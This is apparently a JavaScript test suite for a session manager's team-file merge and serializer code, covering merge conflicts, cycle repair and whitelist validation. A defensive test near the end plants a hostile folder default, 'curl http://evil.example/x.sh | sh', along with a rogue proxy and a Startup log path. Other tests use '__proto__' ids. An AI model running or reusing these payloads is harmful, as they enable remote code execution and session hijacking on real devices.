'use strict';
// Team-sync merge matrix tests + serializer whitelist tests. Every row of
// the design's decision table gets a scenario.

const assert = require('assert');
const { diff, apply, repairCycles } = require('../main/team-merge');
const { serializeNodes, makeTeamFile, validateTeamFile } = require('../main/team-serializer');

const S = (id, over = {}) => ({
    id, type: 'session', parentId: null, order: 0, name: id,
    host: '192.0.2.10', transport: 'ssh', port: null,
    credentialProfile: 'AD Account', jumpHost: null, serial: null,
    logging: null, highlightSet: null, encoding: null, tags: [], notes: '',
    ...over,
});
const tree = (...nodes) => Object.fromEntries(nodes.map((n) => [n.id, n]));

// 1. Remote add -> incoming add.
{
    const base = tree(S('a'));
    const remote = tree(S('a'), S('b'));
    const local = tree(S('a'));
    const p = diff(base, remote, local);
    assert.strictEqual(p.adds.length, 1);
    assert.strictEqual(p.adds[0].node.id, 'b');
    assert.strictEqual(p.conflicts.length, 0);
}

// 2. Remote change, local untouched -> incoming change listing the fields.
{
    const base = tree(S('a'));
    const remote = tree(S('a', { host: '192.0.2.99' }));
    const local = tree(S('a'));
    const p = diff(base, remote, local);
    assert.strictEqual(p.changes.length, 1);
    assert.deepStrictEqual(p.changes[0].fields, ['host']);
}

// 3. Remote removal, local unchanged -> incoming removal.
{
    const base = tree(S('a'), S('b'));
    const remote = tree(S('a'));
    const local = tree(S('a'), S('b'));
    const p = diff(base, remote, local);
    assert.strictEqual(p.removals.length, 1);
    assert.strictEqual(p.removals[0].id, 'b');
}

// 4. Disjoint edits auto-merge: remote changed host, local changed notes.
{
    const base = tree(S('a'));
    const remote = tree(S('a', { host: '192.0.2.99' }));
    const local = tree(S('a', { notes: 'my note' }));
    const p = diff(base, remote, local);
    assert.strictEqual(p.conflicts.length, 0);
    assert.strictEqual(p.changes.length, 1);
    const { local: merged } = apply(p, base, remote, local, {});
    assert.strictEqual(merged.a.host, '192.0.2.99', 'their edit applied');
    assert.strictEqual(merged.a.notes, 'my note', 'my edit kept');
}

// 5. Same-field conflict -> per-node take theirs/mine.
{
    const base = tree(S('a'));
    const remote = tree(S('a', { host: '192.0.2.99' }));
    const local = tree(S('a', { host: '198.51.100.5' }));
    const p = diff(base, remote, local);
    assert.strictEqual(p.conflicts.length, 1);
    assert.deepStrictEqual(p.conflicts[0].fields, ['host']);
    const mine = apply(p, base, remote, local, { conflictTakes: { a: 'mine' } });
    assert.strictEqual(mine.local.a.host, '198.51.100.5');
    const theirs = apply(p, base, remote, local, { conflictTakes: { a: 'theirs' } });
    assert.strictEqual(theirs.local.a.host, '192.0.2.99');
}

// 6. Remote removed, locally modified -> conflict defaulting to keep mine.
{
    const base = tree(S('a'));
    const remote = {};
    const local = tree(S('a', { notes: 'edited' }));
    const p = diff(base, remote, local);
    assert.strictEqual(p.conflicts.length, 1);
    assert.strictEqual(p.conflicts[0].kind, 'delete-modify');
    const { local: merged } = apply(p, base, remote, local, {});
    assert.ok(merged.a, 'default keeps the locally modified node');
}

// 7. Locally removed, remotely modified -> restore-as-conflict (theirs default).
{
    const base = tree(S('a'));
    const remote = tree(S('a', { host: '192.0.2.99' }));
    const local = {};
    const p = diff(base, remote, local);
    assert.strictEqual(p.conflicts.length, 1);
    const { local: merged } = apply(p, base, remote, local, {});
    assert.ok(merged.a, 'remote modify resurrects by default');
}

// 8. Added on both sides, same endpoint -> duplicate suspect; adoption keeps
// the team id only.
{
    const base = {};
    const remote = tree(S('team1', { host: '203.0.113.7' }));
    const local = tree(S('mine1', { host: '203.0.113.7' }));
    const p = diff(base, remote, local);
    assert.strictEqual(p.dupSuspects.length, 1);
    const { local: merged } = apply(p, base, remote, local, { dupAdopt: { mine1: 'team1' } });
    assert.ok(merged.team1 && !merged.mine1, 'adoption swaps to the team id');
}

// 9. Accept-all makes local match remote where untouched, and base := remote.
{
    const base = tree(S('a'), S('b'));
    const remote = tree(S('a', { port: 2022 }), S('c'));
    const local = tree(S('a'), S('b'));
    const p = diff(base, remote, local);
    const { local: merged, base: newBase } = apply(p, base, remote, local, {});
    assert.strictEqual(merged.a.port, 2022);
    assert.ok(merged.c && !merged.b);
    assert.deepStrictEqual(Object.keys(newBase).sort(), ['a', 'c']);
}

// 10. Serializer whitelist: unknown fields dropped, personal subtrees kept
// home, username-in-notes refused.
{
    const nodes = {
        f1: { id: 'f1', type: 'folder', name: 'Lab', parentId: null, order: 0, personal: true },
        s1: S('s1', { parentId: 'f1' }),
        s2: S('s2', { password: 'oops', internalFlag: 42 }),
    };
    const out = serializeNodes(nodes, []);
    assert.ok(!out.f1 && !out.s1, 'personal subtree stays home');
    assert.ok(out.s2 && !('password' in out.s2) && !('internalFlag' in out.s2),
        'non-whitelisted fields cannot leak');

    assert.throws(() => serializeNodes(tree(S('s3', { notes: 'login as jdoe' })), ['jdoe']),
        /refusing to publish/);
}

// 11. Validation rejects credential material and wrong schema.
{
    assert.throws(() => validateTeamFile({ schema: 2, rev: 1, nodes: {} }), /unsupported/);
    assert.throws(() => validateTeamFile({
        schema: 1, rev: 1,
        nodes: { x: { type: 'session', username: 'leak' } },
    }), /credential material/);
    const ok = makeTeamFile(tree(S('a')), 5, [], []);
    assert.strictEqual(validateTeamFile(ok).rev, 5);
}

// 12. Crossed folder moves cannot produce a parent cycle. You move A under
// B while the team moves B under A: edits to different node ids, so both
// auto-merge - and the merged tree would loop forever in every ancestor
// walk. apply() must hand back a tree that terminates.
{
    const F = (id, parentId) => ({ id, type: 'folder', name: id, parentId, order: 0, defaults: {} });
    const base = tree(F('A', null), F('B', null));
    const remote = tree(F('A', null), F('B', 'A'));   // team: B under A
    const local = tree(F('A', 'B'), F('B', null));    // me:   A under B
    const p = diff(base, remote, local);
    assert.strictEqual(p.conflicts.length, 0, 'crossed moves are disjoint edits');
    const { local: merged } = apply(p, base, remote, local, {});
    // Walk from every node; termination is the property under test.
    for (const start of Object.keys(merged)) {
        let hops = 0;
        for (let cur = start; cur; cur = merged[cur] && merged[cur].parentId) {
            if (++hops > Object.keys(merged).length) assert.fail('parent cycle survived apply()');
        }
    }
}

// 13. repairCycles breaks loops and leaves sane trees alone.
{
    const F = (id, parentId) => ({ id, type: 'folder', name: id, parentId, order: 0 });
    const looped = tree(F('A', 'B'), F('B', 'A'), F('C', 'A'));
    const fixed = repairCycles(looped);
    assert.ok(fixed.length >= 1, 'cycle reported');
    let cur = 'C';
    let hops = 0;
    while (cur) {
        assert.ok(++hops < 10, 'walk terminates after repair');
        cur = (looped[cur] || {}).parentId;
    }
    const sane = tree(F('A', null), F('B', 'A'));
    assert.deepStrictEqual(repairCycles(sane), [], 'no false repairs');
    assert.strictEqual(sane.B.parentId, 'A', 'sane tree untouched');
}

// 14. Validation rejects prototype-name node ids.
{
    const evil = JSON.parse('{"schema":1,"rev":1,"nodes":{"__proto__":{"type":"session","name":"x"}}}');
    assert.throws(() => validateTeamFile(evil), /unsafe node id/);
}

// 15. logging.folder is a local path and never travels: stripped when
// publishing AND stripped when reading a file someone else shaped.
{
    const out = serializeNodes(tree(S('s1', {
        logging: { enabled: true, folder: 'C:\\Users\\me\\logs', mode: 'text' },
    })), []);
    assert.ok(!('folder' in out.s1.logging), 'publish strips logging.folder');
    assert.strictEqual(out.s1.logging.enabled, true, 'the rest of logging survives');

    const hostile = validateTeamFile({
        schema: 1, rev: 1,
        nodes: {
            a: {
                id: 'a', type: 'session', name: 'sw', parentId: null,
                logging: { enabled: true, folder: 'C:\\evil\\Startup' },
            },
        },
    });
    assert.ok(!('folder' in hostile.nodes.a.logging), 'read strips a planted logging.folder');
}

// 16. Highlight sets off the share are structure-checked: malformed sets and
// oversized patterns are dropped, sane ones survive untouched.
{
    const checked = validateTeamFile({
        schema: 1, rev: 1, nodes: {},
        highlightSets: [
            { id: 'good', name: 'Good', rules: [{ pattern: 'down', color: '#f00' }] },
            { id: 'bomb', name: 'Bomb', rules: [{ pattern: 'x'.repeat(10000) }] },
            { notAnId: true },
            'not even an object',
        ],
    });
    assert.strictEqual(checked.highlightSets.length, 2, 'malformed sets dropped');
    assert.strictEqual(checked.highlightSets[0].rules.length, 1, 'sane rules survive');
    assert.strictEqual(checked.highlightSets[1].rules.length, 0, 'oversized pattern dropped');

    const none = validateTeamFile({ schema: 1, rev: 1, nodes: {} });
    assert.deepStrictEqual(none.highlightSets, [], 'absent sets normalize to empty');
}

// 17. Snippets ride the team file under the same whitelist discipline:
// unknown fields dropped, malformed entries dropped, sizes capped.
{
    const out = makeTeamFile({}, 1, [], [], [
        { id: 'snip-1', name: 'Save config', command: 'wr mem', notes: 'ok', password: 'leak?' },
        { id: 'snip-2', name: 'Huge', command: 'x'.repeat(20000) },
        { notAnId: true },
        'nonsense',
    ]);
    assert.strictEqual(out.snippets.length, 1, 'malformed and oversized snippets dropped');
    assert.ok(!('password' in out.snippets[0]), 'non-whitelisted snippet fields cannot leak');

    const checked = validateTeamFile({
        schema: 1, rev: 1, nodes: {},
        snippets: [{ id: 'a', name: 'ok', command: 'show version' }, { id: 'b', name: 'bad' }],
    });
    assert.strictEqual(checked.snippets.length, 1, 'read-side snippet validation');
    const none = validateTeamFile({ schema: 1, rev: 1, nodes: {} });
    assert.deepStrictEqual(none.snippets, [], 'absent snippets normalize to empty');
}

// S5: the node's own `id` FIELD, not just its map key. merge.apply writes
// local[node.id] and reaches the store through replaceAll, which bypasses
// upsert's UNSAFE_IDS guard - so a node keyed 'safe' carrying id
// '__proto__' passed validation entirely.
{
    const { validateTeamFile } = require('../main/team-serializer');
    const base = { schema: 1, rev: 1, nodes: {} };
    assert.throws(() => validateTeamFile({ ...base,
        nodes: { safe: { id: '__proto__', type: 'session', name: 'x' } } }),
    /unsafe node id/, "a node whose id FIELD is __proto__ must be refused");
    assert.throws(() => validateTeamFile({ ...base,
        nodes: { safe: { id: 'somethingelse', type: 'session', name: 'x' } } }),
    /disagrees with its own id/, 'a node whose id does not match its key must be refused');
    // ...and an honest node still passes.
    validateTeamFile({ ...base, nodes: { n1: { id: 'n1', type: 'session', name: 'sw' } } });
}

// defaults.onConnect is auto-typed into live sessions on every connect;
// a shared file that carried it would let anyone who can write the share
// type commands into every reader's devices. It never travels, same as
// logging.folder.
{
    const { serializeNodes } = require('../main/team-serializer');
    const out = serializeNodes({
        f1: { id: 'f1', type: 'folder', name: 'Site', parentId: null, order: 1,
            defaults: { credentialProfile: 'AD', onConnect: 'terminal length 0' } },
    }, []);
    assert.ok(out.f1.defaults && out.f1.defaults.credentialProfile === 'AD',
        'other defaults still publish');
    assert.ok(!('onConnect' in out.f1.defaults),
        'defaults.onConnect must never be published to a shared file');
}

// ...and the side that actually meets a hostile file. The strip above is on
// the PUBLISH path; a file arriving off the share meets validateTeamFile,
// which used to pass `defaults` through untouched. A folder's defaults reach
// every session beneath them through the inheritance walk, so that object is
// the highest-value thing in a hostile file:
//   onConnect is auto-typed into every session on every connect - remote
//   command execution on the reader's own gear.
//   proxy silently routes every session in the folder through a host the
//   file chose.
// The Added group in the merge preview renders name and host, so a new
// folder called "Core Switches" carrying a payload looked like nothing but
// the words Core Switches. Whitelist on ingest.
{
    const hostile = validateTeamFile({
        schema: 1, rev: 1,
        nodes: {
            f1: {
                id: 'f1', type: 'folder', name: 'Core Switches', parentId: null,
                defaults: {
                    onConnect: 'curl http://evil.example/x.sh | sh',
                    proxy: 'socks5://evil.example:1080',
                    credentialProfile: 'AD',
                    port: 22,
                    logging: { enabled: true, folder: 'C:\\Users\\me\\Startup' },
                },
            },
        },
    });
    const d = hostile.nodes.f1.defaults;
    assert.ok(!('onConnect' in d),
        'defaults.onConnect must not survive ingest - it types into live devices');
    assert.ok(!('proxy' in d),
        'defaults.proxy must not survive ingest - it decides where sessions dial through');
    assert.strictEqual(d.credentialProfile, 'AD', 'ordinary defaults still arrive');
    assert.strictEqual(d.port, 22);
    assert.ok(!('folder' in d.logging),
        'a log folder inside defaults is stripped like the per-session one');
    // A defaults that is not an object at all must not reach the tree.
    const junk = validateTeamFile({
        schema: 1, rev: 1,
        nodes: { f2: { id: 'f2', type: 'folder', name: 'x', defaults: ['nope'] } },
    });
    assert.ok(junk.nodes.f2.defaults === undefined, 'a non-object defaults is dropped');
}

console.log('ok - team merge + serializer (19 scenarios: matrix, whitelist, cycle repair, field validation, id-field guard, snippets, hostile folder defaults)');
